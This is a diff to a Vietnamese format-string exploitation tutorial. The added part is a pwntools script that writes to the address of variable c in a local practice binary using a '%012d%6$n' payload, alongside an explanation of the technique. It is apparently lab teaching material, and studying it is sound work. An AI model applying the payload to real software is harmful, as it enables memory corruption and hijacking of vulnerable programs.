@@ -104,6 +104,31 @@ int main() {
     - `%012d` sẽ khiến đọc 4 bytes tiếp theo trên stack và thêm padding để tạo thành 12 bytes.
     - `%6$n` sẽ đếm tổng số bytes đã đọc được ở thời điểm hiện tại và lưu vào đối số thứ 6. Với đối số thứ 6 này địa chỉ bắt đầu của buffer và đang trỏ tới địa chỉ của biến `c`. Do đó, tổng số bytes đã được đọc bởi format function là 16 sẽ được lưu vào địa chỉ của biến `c` và `c` sẽ bằng 16.
 
+- Script exploit:  
+
+```python
+from pwn import *
+
+
+def for_c():
+    sh = process('./overwrite')
+    c_addr = int(sh.recvuntil('\n', drop=True), 16)
+    print(hex(c_addr))
+
+    payload = p32(c_addr) + b'%012d' + b'%6$n'
+    print(payload)
+
+    with open('payload.in', 'wb') as f:
+        f.write(payload)
+
+    sh.sendline(payload)
+    print(sh.recv())
+    sh.interactive()
+
+
+for_c()
+```
+
 - Kết quả exploit:  
 
 ![image](https://user-images.githubusercontent.com/44528004/143288425-b2124f91-79e4-4085-b91d-59aa97a8f282.png)
